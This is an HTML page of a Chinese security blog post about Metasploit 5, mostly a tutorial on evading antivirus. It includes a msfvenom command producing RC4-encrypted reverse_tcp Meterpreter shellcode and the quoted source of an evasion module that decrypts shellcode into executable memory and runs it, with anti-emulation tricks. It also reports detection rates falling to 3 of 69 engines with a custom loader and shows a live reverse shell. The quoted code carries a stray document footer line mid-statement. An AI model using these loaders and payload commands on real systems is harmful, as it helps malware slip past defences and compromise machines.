@@ -1,0 +1,150 @@
+<!doctype html><html lang=zh><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>MSF5一些特色以及如何使用其免杀&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=/css/core.min.805532cf9875da8b5e05e28993cdaa5eaf6cb6fd1e14df60b32344efecb93dba87ec77e53ac2336494eb82526410e16c.css integrity=sha384-gFUyz5h12oteBeKJk82qXq9stv0eFN9gsyNE7+y5PbqH7HflOsIzZJTrglJkEOFs><body><div class=base-body><section id=header class="site header"><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
+<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
+<input placeholder="Google 站内搜索" id=search_input style=width:150px>
+<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><title>搜尋</title><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
+document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><div id=content><section class="article header"><h1 class="article title">MSF5一些特色以及如何使用其免杀</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Tuesday, February 5, 2019</p></section><article class="article markdown-body"><blockquote><p>不久前知名的渗透测试框架<code>metasploit frameword</code>进行了一次大得版本更新，从<code>msf4.7</code>更新到了<code>msf5</code>。其中自然少不了一些新特性，笔者在使用新增的功能时，发现这些功能都十分实用，并且非常值得学习。这里我给大家简单介绍一下重要的更新内容，并且使用其做做小实验。</p></blockquote><p>官方release note: <a href=https://blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/>https://blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/</a></p><h2 id=如何更新>如何更新</h2><p>笔者只在Ubuntu、MAC、kali中尝试更新。</p><h3 id=git>GIT</h3><p>官方仓库master已经更新到了<a href=https://github.com/rapid7/metasploit-framework target=_blank>msf5</a>。
+直接使用该仓库重新安装一次即可，可是太麻烦啦！</p><h3 id=ubuntu-18>Ubuntu 18</h3><p>直接使用<code>msfupdate</code>命令即可。</p><h3 id=mac>MAC</h3><p>同上</p><h3 id=kali>kali</h3><p>在<code>/etc/apt/sources.list</code>中添加<code>kali-experimental</code>版本源，例如阿里云源：<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>deb http://mirrors.aliyun.com/kali kali-experimental main non-free contrib 
+deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib </code></pre></div>其实就是把<code>rolling</code>版本换成了<code>experimental</code>，保险起见，你也可以只添加，不覆盖原内容。</p><p>这里我尝试过两种方法，在windows子系统的kali中：
+<code>sudo apt update; apt install metasploit-framework</code>即可</p><p>而虚拟机Kali 2018.4中：
+<code>apt remove metasploit-framework;apt install metasploit/kali-experimental</code></p><p>猜测是因为windows子系统的kali的msf并不是缺省的导致的命令差异。</p><h2 id=简单介绍部分更新内容>简单介绍部分更新内容</h2><h3 id=数据库和自动化的apis>数据库和自动化的APIs</h3><p>意思就是在Postgresql数据库为后端的基础上添加了RESTful API服务，使得msf以及外部工具之间可以进行交互。API文档: <a href=https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service>https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service</a> .</p><h3 id=免杀模块以及库>免杀模块以及库</h3><p>这点是我认为这次更新最实（易）用的一个地方，这里官方介绍的比较模糊，并且只给出了两个已经写好的库。具体的内容都在一份paper中。所以在这里我来具体介绍一下。
+两个已经写好的库</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182059.png><img src=https://cdn.wtfsec.org/img/20200223182059.png alt></a></p><h4 id=免杀模块>免杀模块</h4><p>来看看数日内，这两个可怜的”样本”被杀成什么样了。</p><ul><li>evasion/windows/windows_defender_exe</li></ul><ol><li>火绒:</li></ol><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182248.png><img src=https://cdn.wtfsec.org/img/20200223182248.png alt></a></p><ol start=2><li>Windows defender</li></ol><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182302.png><img src=https://cdn.wtfsec.org/img/20200223182302.png alt></a></p><ol start=3><li>virustotal
+<a href=https://www.virustotal.com/gui/file/949fa29216ff6def7ce55964314e327db90e17ef81310068e67c1441cc5652a5/detection target=_blank>GGbdIwIyp.exe 分析</a>
+<a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182334.png><img src=https://cdn.wtfsec.org/img/20200223182334.png alt></a>
+检出率： 34 / 69</li></ol><ul><li>evasion/windows/windows_defender_js_hta
+1.火绒</li></ul><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182426.png><img src=https://cdn.wtfsec.org/img/20200223182426.png alt></a></p><p>2.Windows defender</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182436.png><img src=https://cdn.wtfsec.org/img/20200223182436.png alt></a></p><p>3.virustotal</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223182445.png><img src=https://cdn.wtfsec.org/img/20200223182445.png alt></a>
+<a href=https://www.virustotal.com/gui/file/9adc88e4645393e434ed1d6f94d8655d7eb8ba51877ad5e757528bb6b82caeb0/detection target=_blank>WMPqRX.hta 分析</a></p><p>可以看到exe文件被查杀的比例虽然偏高，但是依旧过了Windows defender的静态扫描，而HTA则没有这么好运，被Windows defender无情的识别出来了，但是检出率十分可观，可以看到可以绕过大多数知名AV。（PS：我把火绒单独放出来是因为virustotal没有它，并且笔者主机是使用火绒的，但是十分可惜结果不太好看.）</p><p>当然，此次是 msf 第一次放出免杀相关的功能，肯定不仅仅如此，下面的才是最关键的几个点：</p><h3 id=提供模板编译函数>提供模板编译函数</h3><ul><li>Metasploit::Framework::Compiler::Windows.compile_c(code)</li><li>Metasploit::Framework::Compiler::Windows.compile_c_to_file(file_path, code)</li></ul><h3 id=exe-example>EXE Example</h3><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=n>c_template</span> <span class=o>=</span> <span class=o>%</span><span class=n>Q</span><span class=o>|</span><span class=err>#</span><span class=n>include</span> <span class=o>&lt;</span><span class=n>Windows</span><span class=p>.</span><span class=n>h</span><span class=o>&gt;</span>  
+
+<span class=kt>int</span> <span class=n>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>  
+  <span class=n>LPCTSTR</span> <span class=n>lpMessage</span> <span class=o>=</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hello World</span><span class=s>&#34;</span><span class=p>;</span>  
+  <span class=n>LPCTSTR</span> <span class=n>lpTitle</span> <span class=o>=</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hi</span><span class=s>&#34;</span><span class=p>;</span>  
+  <span class=n>MessageBox</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>lpMessage</span><span class=p>,</span> <span class=n>lpTitle</span><span class=p>,</span> <span class=n>MB_OK</span><span class=p>)</span><span class=p>;</span>  
+  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>  
+<span class=p>}</span><span class=o>|</span>  
+
+<span class=n>require</span> <span class=err>&#39;</span><span class=n>metasploit</span><span class=o>/</span><span class=n>framework</span><span class=o>/</span><span class=n>compiler</span><span class=o>/</span><span class=n>windows</span><span class=err>&#39;</span>  
+
+<span class=cp>#</span><span class=cp>This will save the binary in variable exe  </span><span class=cp>
+</span><span class=cp></span><span class=n>exe</span> <span class=o>=</span> <span class=n>Metasploit</span><span class=o>:</span><span class=o>:</span><span class=n>Framework</span><span class=o>:</span><span class=o>:</span><span class=n>Compiler</span><span class=o>:</span><span class=o>:</span><span class=n>Windows</span><span class=p>.</span><span class=n>compile_c</span><span class=p>(</span><span class=n>c_template</span><span class=p>)</span>  
+
+<span class=cp>#</span><span class=cp>This will save the binary as a file  </span><span class=cp>
+</span><span class=cp></span><span class=n>Metasploit</span><span class=o>:</span><span class=o>:</span><span class=n>Framework</span><span class=o>:</span><span class=o>:</span><span class=n>Compiler</span><span class=o>:</span><span class=o>:</span><span class=n>Windows</span><span class=p>.</span><span class=n>compile_c_to_file</span><span class=p>(</span><span class=err>&#39;</span><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>test</span><span class=p>.</span><span class=n>exe</span><span class=err>&#39;</span><span class=p>,</span> <span class=n>c_template</span><span class=p>)</span>  </code></pre></div><h3 id=dll-example>DLL Example</h3><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=n>c_template</span> <span class=o>=</span> <span class=o>%</span><span class=n>Q</span><span class=o>|</span><span class=err>#</span><span class=n>include</span> <span class=o>&lt;</span><span class=n>Windows</span><span class=p>.</span><span class=n>h</span><span class=o>&gt;</span>  
+
+<span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=n>DllMain</span> <span class=n>__attribute__</span><span class=p>(</span><span class=p>(</span><span class=n>export</span><span class=p>)</span><span class=p>)</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>dwReason</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span> <span class=p>{</span>  
+  <span class=k>switch</span> <span class=p>(</span><span class=n>dwReason</span><span class=p>)</span> <span class=p>{</span>  
+    <span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>  
+      <span class=n>MessageBox</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hello World</span><span class=s>&#34;</span><span class=p>,</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hello</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MB_OK</span><span class=p>)</span><span class=p>;</span>  
+      <span class=k>break</span><span class=p>;</span>  
+    <span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>  
+      <span class=k>break</span><span class=p>;</span>  
+    <span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>  
+      <span class=k>break</span><span class=p>;</span>  
+    <span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>  
+      <span class=k>break</span><span class=p>;</span>  
+  <span class=p>}</span>  
+
+  <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>  
+<span class=p>}</span>  
+
+<span class=c1>// This will be a function in the export table  
+</span><span class=c1></span><span class=kt>int</span> <span class=n>Msg</span> <span class=n>__attribute__</span><span class=p>(</span><span class=p>(</span><span class=n>export</span><span class=p>)</span><span class=p>)</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>  
+  <span class=n>MessageBox</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hello World</span><span class=s>&#34;</span><span class=p>,</span> <span class=sa></span><span class=s>&#34;</span><span class=s>Hello</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MB_OK</span><span class=p>)</span><span class=p>;</span>  
+  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>  
+<span class=p>}</span>  
+<span class=o>|</span>  
+
+<span class=n>require</span> <span class=err>&#39;</span><span class=n>metasploit</span><span class=o>/</span><span class=n>framework</span><span class=o>/</span><span class=n>compiler</span><span class=o>/</span><span class=n>windows</span><span class=err>&#39;</span>  
+<span class=n>dll</span> <span class=o>=</span> <span class=n>Metasploit</span><span class=o>:</span><span class=o>:</span><span class=n>Framework</span><span class=o>:</span><span class=o>:</span><span class=n>Compiler</span><span class=o>:</span><span class=o>:</span><span class=n>Windows</span><span class=p>.</span><span class=n>compile_c</span><span class=p>(</span><span class=n>c_template</span><span class=p>,</span> <span class=o>:</span><span class=n>dll</span><span class=p>)</span>  </code></pre></div><h3 id=code-randomization>Code Randomization</h3><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>require <span class=s1>&#39;msf/core&#39;</span>  
+require <span class=s1>&#39;metasploit/framework/compiler/windows&#39;</span>  
+
+<span class=nv>c_source_code</span> <span class=o>=</span> %Q<span class=p>|</span>  
+<span class=c1>#include &lt;Windows.h&gt;</span>  
+
+int main<span class=o>(</span><span class=o>)</span> <span class=o>{</span>  
+  const char* <span class=nv>content</span> <span class=o>=</span> <span class=s2>&#34;Hello World&#34;</span><span class=p>;</span>  
+  const char* <span class=nv>title</span> <span class=o>=</span> <span class=s2>&#34;Hi&#34;</span><span class=p>;</span>  
+  MessageBox<span class=o>(</span>0, content, title, MB_OK<span class=o>)</span><span class=p>;</span>  
+  <span class=k>return</span> 0<span class=p>;</span>  
+<span class=o>}</span><span class=p>|</span>  
+
+<span class=nv>outfile</span> <span class=o>=</span> <span class=s2>&#34;/tmp/helloworld.exe&#34;</span>  
+<span class=nv>weight</span> <span class=o>=</span> <span class=m>70</span> <span class=c1># This value is used to determine how random the code gets.</span>  
+Metasploit::Framework::Compiler::Windows.compile_random_c_to_file<span class=o>(</span>outfile, c_source_code, weight: weight<span class=o>)</span>  </code></pre></div><h3 id=加密方式>加密方式</h3><p>并且此次添加了四种加密方式，分别为AES256-CBC、RC4、XOR和Base64。
+使用方法:</p><ul><li>msfvenom
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c</code>
+此语句将会打印加密后的shellcode，需要自行实现客户端加载。</li><li>模板中
+<code>Msf::Simple::Buffer.transform(payload.encoded, 'c', 'buf', format: 'rc4', key: rc4_key)</code>
+需要结合之前介绍过的编译函数使用。
+例如:<div class=highlight><pre class=chroma><code class=language-shell data-lang=shell><span class=c1>##</span>
+<span class=c1>#This module requires Metasploit: https://metasploit.com/download</span>  
+<span class=c1>#Current source: https://github.com/rapid7/metasploit-framework</span>  
+<span class=c1>##</span>
+require <span class=s1>&#39;metasploit/framework/compiler/windows&#39;</span>  
+class MetasploitModule &lt; Msf::Evasion  
+    def initialize<span class=o>(</span><span class=nv>info</span><span class=o>=</span><span class=o>{</span><span class=o>}</span><span class=o>)</span>  
+        super<span class=o>(</span>merge_info<span class=o>(</span>info,  
+            <span class=s1>&#39;Name&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;Microsoft Windows Defender Evasive Executable&#39;</span>,  
+            <span class=s1>&#39;Description&#39;</span> <span class=o>=</span>&gt; %q<span class=o>{</span>  
+                This module allows you to generate a Windows EXE that evades against Microsoft  
+                Windows Defender. Multiple techniques such as shellcode encryption, <span class=nb>source</span> code obfuscation, Metasm, and anti-emulation are used to achieve this.  
+                For best results, please try to use payloads that use a more secure channel such as HTTPS or RC4 in order to avoid the payload network traffc getting caught by antivirus better.  
+            <span class=o>}</span>,  
+            <span class=s1>&#39;Author&#39;</span> <span class=o>=</span>&gt; <span class=o>[</span> <span class=s1>&#39;sinn3r&#39;</span> <span class=o>]</span>,  
+            <span class=s1>&#39;License&#39;</span> <span class=o>=</span>&gt; MSF_LICENSE,  
+            <span class=s1>&#39;Platform&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;win&#39;</span>,  
+            <span class=s1>&#39;Arch&#39;</span> <span class=o>=</span>&gt; ARCH_X86,  
+            <span class=s1>&#39;Targets&#39;</span> <span class=o>=</span>&gt; <span class=o>[</span> <span class=o>[</span><span class=s1>&#39;Microsoft Windows&#39;</span>, <span class=o>{</span><span class=o>}</span><span class=o>]</span> <span class=o>]</span>  
+        <span class=o>)</span><span class=o>)</span>  
+    end  
+def rc4_key  
+    @rc4_key <span class=o>||</span><span class=o>=</span> Rex::Text.rand_text_alpha<span class=o>(</span>32..64<span class=o>)</span>  
+end  
+def get_payload  
+    @c_payload <span class=o>||</span><span class=o>=</span> lambda <span class=o>{</span>  
+        <span class=nv>opts</span> <span class=o>=</span> <span class=o>{</span> format: <span class=s1>&#39;rc4&#39;</span>, key: rc4_key <span class=o>}</span>  
+        <span class=nv>junk</span> <span class=o>=</span> Rex::Text.rand_text<span class=o>(</span>10..1024<span class=o>)</span>  
+        <span class=nv>p</span> <span class=o>=</span> payload.encoded + junk  
+
+        <span class=k>return</span> <span class=o>{</span>  
+        size: p.length,  
+        c_format: Msf::Simple::Buffer.transform<span class=o>(</span>p, <span class=s1>&#39;c&#39;</span>, <span class=s1>&#39;buf&#39;</span>, opts<span class=o>)</span>  
+        <span class=o>}</span>  
+    <span class=o>}</span>.call  
+end  
+
+def c_template  
+    @c_template <span class=o>||</span><span class=o>=</span> %Q<span class=p>|</span><span class=c1>#include &lt;Windows.h&gt;</span>  
+<span class=c1>#include &lt;rc4.h&gt;</span>  
+// The encrypted code allows us to get around static scanning  
+<span class=c1>#{get_payload[:c_format]}</span>  
+
+int main<span class=o>(</span><span class=o>)</span> <span class=o>{</span>  
+    int <span class=nv>lpBufSize</span> <span class=o>=</span> sizeof<span class=o>(</span>int<span class=o>)</span> * <span class=c1>#{get_payload[:size]};</span>  
+    LPVOID <span class=nv>lpBuf</span> <span class=o>=</span> VirtualAlloc<span class=o>(</span>NULL, lpBufSize, MEM_COMMIT,<span class=p>|</span> Rapid7.com Encapsulating Antivirus <span class=o>(</span>AV<span class=o>)</span> Evasion Techniques - <span class=m>20</span>  
+0x00000040<span class=o>)</span><span class=p>;</span>  
+    memset<span class=o>(</span>lpBuf, <span class=s1>&#39;&#39;</span>, lpBufSize<span class=o>)</span><span class=p>;</span>  
+    HANDLE <span class=nv>proc</span> <span class=o>=</span> OpenProcess<span class=o>(</span>0x1F0FFF, false, 4<span class=o>)</span><span class=p>;</span>  
+    // Checking NULL allows us to get around Real-time protection  
+    <span class=k>if</span> <span class=o>(</span><span class=nv>proc</span> <span class=o>=</span><span class=o>=</span> NULL<span class=o>)</span> <span class=o>{</span>  
+        RC4<span class=o>(</span><span class=s2>&#34;#{rc4_key}&#34;</span>, buf, <span class=o>(</span>char*<span class=o>)</span> lpBuf, <span class=c1>#{get_payload[:size]});</span>  
+        void <span class=o>(</span>*func<span class=o>)</span><span class=o>(</span><span class=o>)</span><span class=p>;</span>  
+        <span class=nv>func</span> <span class=o>=</span> <span class=o>(</span>void <span class=o>(</span>*<span class=o>)</span><span class=o>(</span><span class=o>)</span><span class=o>)</span> lpBuf<span class=p>;</span>  
+        <span class=o>(</span>void<span class=o>)</span><span class=o>(</span>*func<span class=o>)</span><span class=o>(</span><span class=o>)</span><span class=p>;</span>  
+    <span class=o>}</span>  
+
+    <span class=k>return</span> 0<span class=p>;</span>  
+<span class=o>}</span><span class=p>|</span>  
+    end  
+    def run  
+        vprint_line c_template  
+        <span class=c1># The randomized code allows us to generate a unique EXE</span>  
+        <span class=nv>bin</span> <span class=o>=</span> Metasploit::Framework::Compiler::Windows.compile_  
+        random_c<span class=o>(</span>c_template<span class=o>)</span>  
+        print_status<span class=o>(</span><span class=s2>&#34;Compiled executable size: #{bin.length}&#34;</span><span class=o>)</span>  
+        file_create<span class=o>(</span>bin<span class=o>)</span>  
+    end  
+end  </code></pre></div>为了方便，笔者使用第一种方法来实现。</li></ul><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183108.png><img src=https://cdn.wtfsec.org/img/20200223183108.png alt></a></p><p>这里我使用base64的加密方式，然后自行编写解码执行shellcode的客户端程序。</p><p>然后msf开启监听，这里使用msf5添加的handler指令直接添加一个listener。</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183120.png><img src=https://cdn.wtfsec.org/img/20200223183120.png alt></a></p><p>先查看我们写的客户端免杀效果如何。</p><ul><li><p>火绒</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183202.png><img src=https://cdn.wtfsec.org/img/20200223183202.png alt></a></p></li><li><p>windows defender</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183215.png><img src=https://cdn.wtfsec.org/img/20200223183215.png alt></a></p><p>抽风了，是之前的文件，我自己给删除了，结果显示还在。</p></li><li><p>virustotal</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183239.png><img src=https://cdn.wtfsec.org/img/20200223183239.png alt></a>
+检出率： 3 / 69
+这三款我只关注某知名AV，这个报的病毒类型是典型专属它的误报，多的不说了直接上真实环境看看。
+<a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183313.png><img src=https://cdn.wtfsec.org/img/20200223183313.png alt></a></p></li></ul><p>跑起来试试</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183327.png><img src=https://cdn.wtfsec.org/img/20200223183327.png alt></a></p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183339.png><img src=https://cdn.wtfsec.org/img/20200223183339.png alt></a></p><h3 id=一些特色>一些特色</h3><ul><li><p>搜索速度</p><p>msf5的漏洞搜索功能变得飞快了，没有了原来的<code>slow search</code>。</p></li><li><p>background</p><p>所有的session类型都支持<code>background</code>指令了，我猜很多小伙伴都被直接弹回来的shell/cmd烦恼过。这里我使用臭名昭著的<code>windows/shell/reverse_tcp</code>
+<a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183458.png><img src=https://cdn.wtfsec.org/img/20200223183458.png alt></a></p></li></ul><p>这个类型的session会直接谈一个shell到你的msfconsole，并且无法挂在后台，非常烦人，容易手误关闭shell，比如原来的ms17-010模块默认就是这个坑爹的模块，漏洞本身不能短时间多次利用，常常耽误很多时间。</p><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223183535.png><img src=https://cdn.wtfsec.org/img/20200223183535.png alt></a></p><p>不过值得注意的是，当你进入这个session，也就是shell的时候，仍然无法退出到msfconsole，只能关闭session出来…</p><ul><li>拓展模块支持更多语言
+现在支持Go, Python, 以及 Ruby了。额外添加的两个语言都是非常棒，笔者都学习过的语言，可以预见到未来的模块遍地开花！</li></ul><h2 id=结语>结语</h2><p>关于本次更新，笔者也是关注的官方公告，以及周围小伙伴的口口相传，所以可能会有不少遗漏内容，文章也写的比较口语化，旨在分享知识，请大家多多包涵，最后祝愿所有朋友新的一年技术节节高升。</p><section class="article labels"><a class=category href=/categories/%E8%BD%AC%E8%BD%BD/>转载</a><a class=tag href=/tags/metasploit/>Metasploit</a><a class=tag href=/tags/%E5%85%8D%E6%9D%80/>免杀</a></section></article><div class="article navigation"><p><a class=link href=/posts/vmware%E8%99%9A%E6%8B%9F%E6%9C%BAkali%E8%BF%9E%E6%8E%A5acr122u%E9%81%87%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E5%9D%91%E6%80%BB%E7%BB%93/><span class=li>&larr;</span>VMware虚拟机Kali连接ACR122U遇到的各种坑总结</a><p><a class=link href=/posts/c-sharp-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%BC%80%E6%BA%90%E5%95%A6/><span class=li>&rarr;</span>C# 多线程网站后台批量扫描工具开源啦</a></p></div></div><section id=footer class=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></div></body></html>
